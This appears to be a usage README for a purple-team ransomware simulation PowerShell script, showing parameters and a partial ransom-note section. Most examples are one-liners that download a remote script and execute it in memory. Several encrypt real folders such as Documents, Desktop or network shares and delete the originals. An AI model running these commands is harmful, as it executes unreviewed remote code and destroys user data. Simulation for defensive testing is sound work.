# Purple Team Ransomware Simulator - USAGE EXAMPLES

## EXAMPLE 1: Safe Mode - Single Folder (Keeps Originals)
### Target: C:\Test with text files only, no recursion
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "C:\Test" -Extensions @("txt") 
```

## EXAMPLE 2: Safe Mode - Recursive Documents Folder
### Target: All office docs in user documents, recursive search
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "$env:USERPROFILE\Documents" -Extensions @("txt","doc","docx","pdf") -Recurse
```

## EXAMPLE 3: Full Simulation - Destructive (Deletes Originals)
### ⚠️ LAB ONLY - Creates ransom notes + deletes originals
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "C:\Lab\Target" -Extensions @("txt","docx","xlsx","pptx","pdf") -Recurse -Delete
```

## EXAMPLE 4: Targeted Attack Simulation - Finance Folder
### Simulate targeted ransomware against specific extensions
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "C:\Lab\Finance" -Extensions @("xls","xlsx","csv","pdf") -Recurse -Delete
```

## EXAMPLE 5: Desktop Simulation - Common User Files
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "$env:USERPROFILE\Desktop" -Extensions @("txt","doc","jpg","png") -Recurse -Delete
```

## EXAMPLE 6: Local File Execution (Alternative to irm)
### Save script as encrypt.ps1 and run locally
```
.\encrypt.ps1 -Path "C:\Test" -Extensions "txt","log" -Recurse
```

## EXAMPLE 7: Network Share Simulation
### Target mapped drive or UNC path (requires permissions)
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "\\Server\Share\Documents" -Extensions @("docx","pdf") -Recurse -Delete
```

## EXAMPLE 8: Minimal Test - Single File Type, No Recursion
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSim.ps1))) -Path "C:\Temp" -Extensions @("txt")
```

## Parameters
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Path` | `string` | ✅ Yes | Target directory |
| `-Extensions` | `string[]` | ✅ Yes | File extensions (without `.`) |
| `-Recurse` | `switch` | No | Search subdirectories |
| `-Delete` | `switch` | No | **Delete originals** after encryption |

## Ransom Note Contents
Creates `PURPLE_TEAM_RANSOM_NOTE.txt` in each affected folder:

